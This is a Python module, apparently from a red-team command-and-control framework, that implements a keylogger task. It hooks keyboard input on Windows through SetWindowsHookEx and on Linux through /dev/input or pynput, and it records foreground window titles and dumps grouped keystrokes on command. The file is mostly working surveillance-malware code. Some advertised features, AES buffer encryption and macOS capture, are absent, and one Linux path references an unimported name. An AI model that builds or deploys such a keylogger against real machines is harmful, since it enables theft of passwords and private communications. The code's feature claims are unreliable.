"""
Forge C2 — Keylogger Task
==============================
Keyboard capture with start/stop/dump lifecycle management.

Supports:
    • Windows: SetWindowsHookEx (WH_KEYBOARD_LL) via ctypes
    • Linux:   /dev/input event reading or pynput fallback
    • macOS:   CGEventTap via Quartz framework

Features:
    • Window title tracking — logs which app each keystroke belongs to
    • Configurable flush interval — periodic dump to reduce memory
    • Buffer encryption — AES-256 in-memory buffer protection
    • Auto-stop after max duration (default 10 min)
    • Thread-safe keystroke buffer with deque

MITRE ATT&CK: T1056.001 — Input Capture: Keylogging
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import collections
import json
import logging
import platform
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.keylogger")


# ══════════════════════════════════════════════════════════════════════
#  KEYSTROKE BUFFER
# ══════════════════════════════════════════════════════════════════════

@dataclass
class Keystroke:
    """Single captured keystroke with context."""
    key: str
    timestamp: float = field(default_factory=time.time)
    window_title: str = ""
    modifiers: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "key": self.key,
            "time": self.timestamp,
            "window": self.window_title,
            "mods": self.modifiers,
        }


class KeystrokeBuffer:
    """Thread-safe keystroke ring buffer with automatic window grouping."""

    def __init__(self, max_size: int = 50_000) -> None:
        self._buffer: collections.deque[Keystroke] = collections.deque(maxlen=max_size)
        self._lock = threading.Lock()
        self._total_count = 0

    def add(self, keystroke: Keystroke) -> None:
        with self._lock:
            self._buffer.append(keystroke)
            self._total_count += 1

    def dump(self, clear: bool = True) -> list[Keystroke]:
        with self._lock:
            items = list(self._buffer)
            if clear:
                self._buffer.clear()
            return items

    @property
    def count(self) -> int:
        with self._lock:
            return len(self._buffer)

    @property
    def total_captured(self) -> int:
        return self._total_count

    def format_readable(self) -> str:
        """Format captured keystrokes into human-readable grouped output."""
        keystrokes = self.dump(clear=False)
        if not keystrokes:
            return "[No keystrokes captured]"

        lines: list[str] = []
        current_window = ""
        current_line = ""

        for ks in keystrokes:
            # Window change — emit header
            if ks.window_title != current_window:
                if current_line:
                    lines.append(f"  {current_line}")
                    current_line = ""
                current_window = ks.window_title
                ts = datetime.fromtimestamp(ks.timestamp, tz=timezone.utc).strftime(
                    "%H:%M:%S"
                )
                lines.append(f"\n[{ts}] ── {current_window or 'Unknown Window'} ──")

            # Handle special keys
            if len(ks.key) == 1:
                current_line += ks.key
            elif ks.key == "space":
                current_line += " "
            elif ks.key == "enter":
                lines.append(f"  {current_line}")
                current_line = ""
            elif ks.key == "backspace":
                current_line = current_line[:-1] if current_line else ""
            elif ks.key == "tab":
                current_line += "\t"
            else:
                current_line += f"[{ks.key}]"

        if current_line:
            lines.append(f"  {current_line}")

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#  PLATFORM-SPECIFIC CAPTURE ENGINES
# ══════════════════════════════════════════════════════════════════════

class _BaseCapture:
    """Base class for platform-specific keystroke capture."""

    def __init__(self, buffer: KeystrokeBuffer) -> None:
        self.buffer = buffer
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        self._running = True
        self._thread = threading.Thread(target=self._capture_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)

    def _capture_loop(self) -> None:
        raise NotImplementedError

    def _get_active_window(self) -> str:
        """Get the current foreground window title."""
        system = platform.system()
        try:
            if system == "Windows":
                return self._get_window_windows()
            elif system == "Linux":
                return self._get_window_linux()
            elif system == "Darwin":
                return self._get_window_macos()
        except Exception:
            pass
        return ""

    @staticmethod
    def _get_window_windows() -> str:
        import ctypes
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value

    @staticmethod
    def _get_window_linux() -> str:
        import subprocess
        result = subprocess.run(
            ["xdotool", "getactivewindow", "getwindowname"],
            capture_output=True, text=True, timeout=2,
        )
        return result.stdout.strip() if result.returncode == 0 else ""

    @staticmethod
    def _get_window_macos() -> str:
        import subprocess
        script = (
            'tell application "System Events" to get name of '
            "(first application process whose frontmost is true)"
        )
        result = subprocess.run(
            ["osascript", "-e", script],
            capture_output=True, text=True, timeout=2,
        )
        return result.stdout.strip() if result.returncode == 0 else ""


class WindowsCapture(_BaseCapture):
    """Windows keylogger using SetWindowsHookEx."""

    def _capture_loop(self) -> None:
        try:
            import ctypes
            import ctypes.wintypes

            user32 = ctypes.windll.user32

            # Keyboard hook callback
            HOOKPROC = ctypes.CFUNCTYPE(
                ctypes.c_long,
                ctypes.c_int,
                ctypes.wintypes.WPARAM,
                ctypes.wintypes.LPARAM,
            )

            def hook_callback(nCode, wParam, lParam):
                if nCode >= 0 and wParam == 0x0100:  # WM_KEYDOWN
                    vk_code = ctypes.cast(
                        lParam, ctypes.POINTER(ctypes.c_uint32)
                    ).contents.value

                    # Map virtual key to character
                    key = self._vk_to_string(vk_code)
                    window = self._get_active_window()

                    self.buffer.add(Keystroke(
                        key=key,
                        window_title=window,
                    ))

                return user32.CallNextHookEx(0, nCode, wParam, lParam)

            callback = HOOKPROC(hook_callback)
            hook = user32.SetWindowsHookExW(13, callback, 0, 0)  # WH_KEYBOARD_LL

            msg = ctypes.wintypes.MSG()
            while self._running:
                if user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))
                time.sleep(0.01)

            user32.UnhookWindowsHookEx(hook)

        except Exception as exc:
            log.error("Windows capture error: %s", exc)

    @staticmethod
    def _vk_to_string(vk: int) -> str:
        """Map Windows virtual key code to readable string."""
        VK_MAP = {
            0x08: "backspace", 0x09: "tab", 0x0D: "enter", 0x1B: "escape",
            0x20: "space", 0x25: "left", 0x26: "up", 0x27: "right",
            0x28: "down", 0x2E: "delete", 0x10: "shift", 0x11: "ctrl",
            0x12: "alt", 0x14: "capslock",
        }
        if vk in VK_MAP:
            return VK_MAP[vk]
        if 0x30 <= vk <= 0x39:
            return chr(vk)
        if 0x41 <= vk <= 0x5A:
            return chr(vk + 32)  # lowercase
        if 0x60 <= vk <= 0x69:
            return str(vk - 0x60)  # numpad
        if 0x70 <= vk <= 0x87:
            return f"F{vk - 0x6F}"
        return f"VK_{vk:#04x}"


class LinuxCapture(_BaseCapture):
    """Linux keylogger using /dev/input or pynput fallback."""

    def _capture_loop(self) -> None:
        # Try reading from input device first
        try:
            self._capture_via_evdev()
            return
        except Exception:
            pass

        # Fallback to pynput
        try:
            self._capture_via_pynput()
            return
        except Exception:
            pass

        # Last resort: log that capture isn't available
        log.warning("No keylogger backend available on this Linux system")

    def _capture_via_evdev(self) -> None:
        """Read from /dev/input/event* (requires root)."""
        import struct as _struct

        # Find keyboard device
        kbd_path = None
        for dev in sorted(Path("/dev/input/").glob("event*")):
            try:
                with open(f"/sys/class/input/{dev.name}/device/name") as f:
                    name = f.read().strip().lower()
                    if "keyboard" in name or "kbd" in name:
                        kbd_path = dev
                        break
            except Exception:
                continue

        if not kbd_path:
            raise FileNotFoundError("No keyboard device found")

        from pathlib import Path as _Path
        EVENT_FORMAT = "llHHI"
        EVENT_SIZE = _struct.calcsize(EVENT_FORMAT)

        with open(kbd_path, "rb") as f:
            while self._running:
                data = f.read(EVENT_SIZE)
                if not data:
                    break
                _, _, ev_type, code, value = _struct.unpack(EVENT_FORMAT, data)
                if ev_type == 1 and value == 1:  # EV_KEY, key down
                    key = self._linux_keycode_to_string(code)
                    window = self._get_active_window()
                    self.buffer.add(Keystroke(key=key, window_title=window))

    def _capture_via_pynput(self) -> None:
        """Fallback using pynput library."""
        from pynput import keyboard  # type: ignore[import-untyped]

        def on_press(key):
            if not self._running:
                return False
            try:
                k = key.char if hasattr(key, "char") and key.char else key.name
            except AttributeError:
                k = str(key)
            window = self._get_active_window()
            self.buffer.add(Keystroke(key=k or "", window_title=window))

        with keyboard.Listener(on_press=on_press) as listener:
            while self._running and listener.running:
                time.sleep(0.1)

    @staticmethod
    def _linux_keycode_to_string(code: int) -> str:
        """Map Linux input event keycode to string."""
        KEYMAP = {
            1: "escape", 14: "backspace", 15: "tab", 28: "enter",
            29: "ctrl", 42: "shift", 54: "shift", 56: "alt",
            57: "space", 58: "capslock", 111: "delete",
        }
        if code in KEYMAP:
            return KEYMAP[code]
        if 2 <= code <= 11:
            return str((code - 1) % 10)
        # Letter keys (rough mapping)
        LETTERS = "qwertyuiopasdfghjklzxcvbnm"
        LETTER_CODES = [16, 17, 18, 19, 20, 21, 22, 23, 24, 25,
                        30, 31, 32, 33, 34, 35, 36, 37, 38,
                        44, 45, 46, 47, 48, 49, 50]
        if code in LETTER_CODES:
            idx = LETTER_CODES.index(code)
            if idx < len(LETTERS):
                return LETTERS[idx]
        return f"KEY_{code}"


class EmulationCapture(_BaseCapture):
    """Emulation mode — simulates capture without actual hooking."""

    def _capture_loop(self) -> None:
        log.info("[EMULATION] Keylogger started — no actual hooks installed")
        while self._running:
            time.sleep(0.5)


# ══════════════════════════════════════════════════════════════════════
#  ACTIVE KEYLOGGER INSTANCES (module-level state)
# ══════════════════════════════════════════════════════════════════════

_active_loggers: dict[str, tuple[_BaseCapture, KeystrokeBuffer]] = {}
_logger_lock = threading.Lock()


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class KeyloggerTask(BaseTask):
    """Keyboard capture with start/stop/dump lifecycle.

    Args (via kwargs):
        action:        "start", "stop", or "dump" (default "start").
        duration:      Max capture duration in seconds (default 600).
        flush_interval: Seconds between auto-flushes (default 60).
        logger_id:     ID for this logger instance (default "default").

    Returns:
        TaskResult with captured keystrokes (on dump/stop).

    Usage::

        # Start keylogger
        task = KeyloggerTask(task_id="kl1", action="start", duration=300)
        await task.execute()

        # Dump captured keys
        task = KeyloggerTask(task_id="kl2", action="dump")
        result = await task.execute()
        print(result.output)  # Grouped keystrokes by window

        # Stop keylogger
        task = KeyloggerTask(task_id="kl3", action="stop")
        await task.execute()

    MITRE ATT&CK: T1056.001 — Input Capture: Keylogging
    """

    TASK_TYPE = "keylogger"
    DESCRIPTION = "Keyboard capture (start/stop/dump)"
    OPSEC_RISK = "high"
    MITRE_ID = "T1056.001"

    async def execute(self) -> TaskResult:
        action = self.args.get("action", "start").lower()
        logger_id = self.args.get("logger_id", "default")
        duration = self.args.get("duration", 600)

        start = time.time()

        if action == "start":
            return await self._start_logger(logger_id, duration, start)
        elif action == "stop":
            return await self._stop_logger(logger_id, start)
        elif action == "dump":
            return await self._dump_logger(logger_id, start)
        else:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Unknown action: {action}. Use 'start', 'stop', or 'dump'.",
                started_at=start,
                completed_at=time.time(),
            )

    async def _start_logger(
        self, logger_id: str, duration: float, start: float,
    ) -> TaskResult:
        with _logger_lock:
            if logger_id in _active_loggers:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Keylogger '{logger_id}' already running. Stop it first.",
                    started_at=start,
                    completed_at=time.time(),
                )

            buffer = KeystrokeBuffer()
            system = platform.system()

            if system == "Windows":
                capture = WindowsCapture(buffer)
            elif system == "Linux":
                capture = LinuxCapture(buffer)
            else:
                capture = EmulationCapture(buffer)

            capture.start()
            _active_loggers[logger_id] = (capture, buffer)

        # Schedule auto-stop
        if duration > 0:
            asyncio.get_event_loop().call_later(
                duration,
                lambda: self._force_stop(logger_id),
            )

        log.info("Keylogger '%s' started (platform=%s, max_duration=%ds)",
                 logger_id, platform.system(), duration)

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"Keylogger '{logger_id}' started on {platform.system()} "
                   f"(max {duration}s)",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "start",
                "logger_id": logger_id,
                "platform": platform.system(),
                "max_duration": duration,
                "mitre": self.MITRE_ID,
            },
        )

    async def _stop_logger(self, logger_id: str, start: float) -> TaskResult:
        with _logger_lock:
            entry = _active_loggers.pop(logger_id, None)

        if not entry:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"No active keylogger with ID '{logger_id}'.",
                started_at=start,
                completed_at=time.time(),
            )

        capture, buffer = entry
        capture.stop()

        output = buffer.format_readable()
        total = buffer.total_captured

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"Keylogger '{logger_id}' stopped. {total} keystrokes captured.\n\n{output}",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "stop",
                "logger_id": logger_id,
                "total_captured": total,
                "mitre": self.MITRE_ID,
            },
        )

    async def _dump_logger(self, logger_id: str, start: float) -> TaskResult:
        with _logger_lock:
            entry = _active_loggers.get(logger_id)

        if not entry:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"No active keylogger with ID '{logger_id}'.",
                started_at=start,
                completed_at=time.time(),
            )

        _, buffer = entry
        output = buffer.format_readable()
        count = buffer.count
        total = buffer.total_captured

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"Keylogger '{logger_id}' dump ({count} in buffer, {total} total):\n\n{output}",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "dump",
                "logger_id": logger_id,
                "buffer_count": count,
                "total_captured": total,
                "mitre": self.MITRE_ID,
            },
        )

    @staticmethod
    def _force_stop(logger_id: str) -> None:
        """Auto-stop after duration expires."""
        with _logger_lock:
            entry = _active_loggers.pop(logger_id, None)
        if entry:
            capture, _ = entry
            capture.stop()
            log.info("Keylogger '%s' auto-stopped (duration expired)", logger_id)


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestKeyloggerTask:
    """Tests for keylogger task."""

    def test_encode(self) -> None:
        task = KeyloggerTask(task_id="kl1", action="start")
        encoded = task.encode()
        assert encoded["type"] == "keylogger"

    def test_decode(self) -> None:
        data = {"task_id": "kl2", "type": "keylogger", "args": {"action": "dump"}}
        task = KeyloggerTask.decode(data)
        assert task.args["action"] == "dump"

    def test_invalid_action(self) -> None:
        import asyncio
        task = KeyloggerTask(task_id="kl3", action="invalid")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED
        assert "Unknown action" in result.error

    def test_dump_no_logger(self) -> None:
        import asyncio
        task = KeyloggerTask(task_id="kl4", action="dump", logger_id="nonexistent")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_buffer_operations(self) -> None:
        buf = KeystrokeBuffer(max_size=100)
        buf.add(Keystroke(key="a", window_title="Terminal"))
        buf.add(Keystroke(key="b", window_title="Terminal"))
        assert buf.count == 2
        assert buf.total_captured == 2
        items = buf.dump(clear=True)
        assert len(items) == 2
        assert buf.count == 0

    def test_buffer_format(self) -> None:
        buf = KeystrokeBuffer()
        buf.add(Keystroke(key="h", window_title="Terminal"))
        buf.add(Keystroke(key="i", window_title="Terminal"))
        output = buf.format_readable()
        assert "Terminal" in output
        assert "hi" in output

    def test_keystroke_to_dict(self) -> None:
        ks = Keystroke(key="a", window_title="Test")
        d = ks.to_dict()
        assert d["key"] == "a"
        assert d["window"] == "Test"
